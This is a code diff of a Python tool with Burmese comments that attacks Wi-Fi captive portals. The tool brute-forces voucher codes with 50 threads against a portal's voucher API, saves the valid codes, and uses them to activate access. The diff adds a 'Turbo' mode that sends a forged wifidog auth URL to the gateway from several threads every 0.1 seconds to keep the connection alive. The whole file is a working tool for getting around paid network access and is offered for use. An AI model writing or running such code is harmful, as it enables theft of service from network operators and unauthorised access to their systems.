@@ -15,8 +15,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # --- CONFIGURATION ---
 SUCCESS_CODES_FILE = "success.txt"
 TRIED_CODES_FILE = "tried.txt"
-VOUCHER_THREADS = 50 # Threads အရေအတွက်
-PING_INTERVAL = 1 # Ping ထိုးမည့် ကြားကာလ
+VOUCHER_THREADS = 50 # Voucher ရှာမည့် Thread အရေအတွက်
+PING_THREADS = 5 # Internet မြှင့်တင်မည့် Thread အရေအတွက်
+PING_INTERVAL = 0.1 # Pinging ကြားကာလ (Turbo)
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
@@ -69,28 +70,7 @@ def get_session_id(session, portal_url):
     except:
         return None
 
-# --- BACKGROUND PINGER ---
-def start_background_ping(session, portal_host, sid):
-    """Session ပြတ်မသွားအောင် Background မှာ Ping ပေးခြင်း"""
-    # Portal ပေါ်မူတည်၍ URL ပြင်ရန်လိုနိုင်သည်
-    ping_url = f"{portal_host}/api/auth/keepalive/"
-    def pinger():
-        print(f"\n📡 Internet လိုင်းကျမသွားအောင် ထိန်းထားသည်... (Ctrl+C ဖြင့် ရပ်နိုင်သည်)")
-        while True:
-            try:
-                r = session.get(ping_url, params={'sessionId': sid}, timeout=5)
-                if r.status_code == 200:
-                    print(f"\r[📡 Background Ping: OK] Session: {sid[:5]}...", end="", flush=True)
-                else:
-                    print(f"\r[📡 Background Ping: FAIL] Trying again...", end="", flush=True)
-            except:
-                print(f"\r[📡 Background Ping: ERROR] Trying again...", end="", flush=True)
-            time.sleep(PING_INTERVAL)
-    
-    pinger_thread = threading.Thread(target=pinger, daemon=True)
-    pinger_thread.start()
-
-# --- MENU 1: TEST SPECIFIC CODE + CONNECT ---
+# --- MENU 1: TEST CODE + CONNECT ---
 def test_specific_code():
     code_to_test = input("\n👉 စမ်းသပ်လိုသည့် Code ကိုရိုက်ပါ: ")
     print(f"\n🔍 စမ်းသပ်နေသည်: {code_to_test} ...")
@@ -116,11 +96,7 @@ def test_specific_code():
             print(f"\n\033[92m✅ SUCCESS! Valid Code: {code_to_test}\033[0m")
             with open(SUCCESS_CODES_FILE, "a") as f:
                 f.write(f"{code_to_test}\n")
-            
-            # --- INTERNET ချိတ်ဆက်ခြင်း ---
-            print("📡 Internet ချိတ်ဆက်နေသည်...")
-            start_background_ping(session, portal_host, sid)
-            while True: time.sleep(1) # Script မရပ်အောင်ထားခြင်း
+            print("📡 Internet ချိတ်ဆက်မှု အောင်မြင်သည်။")
         else:
             print(f"\n❌ FAIL! Invalid Code: {code_to_test}")
             
@@ -152,7 +128,7 @@ def worker(tried_codes, portal_host, sid, session):
             pass
 
 def start_fast_harvesting():
-    print("\n🚀 Fast Random Harvesting စတင်ပြီ... (Internet ရနေလည်း ရှာပါမည်)")
+    print("\n🚀 Fast Random Harvesting စတင်ပြီ...")
     tried_codes = load_tried_codes()
     print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")
 
@@ -198,12 +174,29 @@ def view_success_codes():
     print("========================================")
     input("👉 Enter ကိုနှိပ်ပြီး Menu သို့ပြန်သွားပါ။")
 
-# --- MENU 5: FAST INTERNET ACCESS ---
-def fast_internet_access():
-    print("\n🌐 Internet Access အတွက် Code စစ်ဆေးနေသည်...")
+# --- MENU 5: TURBO INTERNET ACCESS (Your Script) ---
+def turbo_internet_access():
+    print("\n🌐 Turbo Internet Access စတင်ပြီ...")
     
+    # 1. Portal နှင့် Session ID ယူခြင်း
+    portal_host, portal_url = get_portal_info()
+    if not portal_host:
+        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
+        time.sleep(2)
+        return
+
+    session = requests.Session()
+    sid = get_session_id(session, portal_url)
+    if not sid:
+        print("❌ Session ID ယူမရပါ။")
+        time.sleep(2)
+        return
+        
+    print(f"📡 Session Found: {sid}")
+
+    # 2. Code သုံးပြီး Activation
     if not os.path.exists(SUCCESS_CODES_FILE):
-        print("❌ Success Codes များမရှိပါ။")
+        print("❌ Success Codes များမရှိပါ။ Menu 2 ဖြင့် အရင်ရှာပါ။")
         time.sleep(2)
         return
 
@@ -216,36 +209,46 @@ def fast_internet_access():
         code = codes[-1] # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်
 
     print(f"📡 သုံးစွဲမည့် Code: {code}")
-    
-    portal_host, portal_url = get_portal_info()
-    if not portal_host:
-        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
-        return
-
-    session = requests.Session()
-    sid = get_session_id(session, portal_url)
-    
-    if not sid:
-        print("❌ Session ID ယူမရပါ။")
-        return
-    
     voucher_api = f"{portal_host}/api/auth/voucher/"
     
     try:
         v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-        
         if v_res.status_code == 200 and "\"success\":true" in v_res.text:
-            print(f"\n\033[92m✅ SUCCESS! Internet Access Connected.\033[0m")
-            # --- PING ထိန်းထားရန် ---
-            start_background_ping(session, portal_host, sid)
-            while True: time.sleep(1) # Script မရပ်အောင်ထားခြင်း
+            print(f"\033[92m✅ SUCCESS! Voucher Activated.\033[0m")
         else:
-            print(f"\n❌ FAIL! Cannot connect with code.")
-            
+            print(f"❌ Voucher Activation Failed.")
     except Exception as e:
-        print(f"\n❌ Error: {e}")
-    
-    time.sleep(2)
+        print(f"❌ Error during activation: {e}")
+
+    # 3. Turbo Pinging Threads များ (Your script logic)
+    parsed_portal = urlparse(portal_url)
+    params = parse_qs(parsed_portal.query)
+    gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+    gw_port = params.get('gw_port', ['2060'])[0]
+    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+
+    def high_speed_ping():
+        """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
+        while True:
+            try:
+                res = session.get(auth_link, timeout=5)
+                print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid[:5]}... (Status: OK)   ", end='\r')
+            except:
+                print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid[:5]}... (Status: ERROR)", end='\r')
+            time.sleep(PING_INTERVAL)
+
+    print(f"[*] Starting {PING_THREADS} Turbo Pinging Threads...")
+    for _ in range(PING_THREADS):
+        threading.Thread(target=high_speed_ping, daemon=True).start()
+
+    # Internet လိုင်းတောက်လျှောက်ရနေအောင် ထိန်းထားခြင်း
+    while True:
+        try:
+            requests.get("http://www.google.com", timeout=3)
+            time.sleep(5)
+        except:
+            print("\n❌ Internet Disconnected. Trying to reconnect...")
+            break
 
 # --- MENU SYSTEM ---
 def show_menu():
@@ -257,7 +260,7 @@ def show_menu():
     
     success_count = 0
     if os.path.exists(SUCCESS_CODES_FILE):
-        with open(TRIED_CODES_FILE, "r") as f:
+        with open(SUCCESS_CODES_FILE, "r") as f:
             success_count = len(f.readlines())
 
     print("========================================")
@@ -269,7 +272,7 @@ def show_menu():
     print("2. 🚀 Fast Harvesting")
     print("3. 📋 View Success Codes")
     print("4. 🔄 Reset Data (Start Over)")
-    print("5. 🌐 Fast Internet Access")
+    print("5. 🌐 Turbo Internet Access")
     print("========================================\n")
     choice = input("👉 ရွေးချယ်ပါ (1-5): ")
     return choice
@@ -286,7 +289,7 @@ if __name__ == "__main__":
         elif choice == '4':
             reset_files()
         elif choice == '5':
-            fast_internet_access()
+            turbo_internet_access()
         else:
             print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
             time.sleep(1)
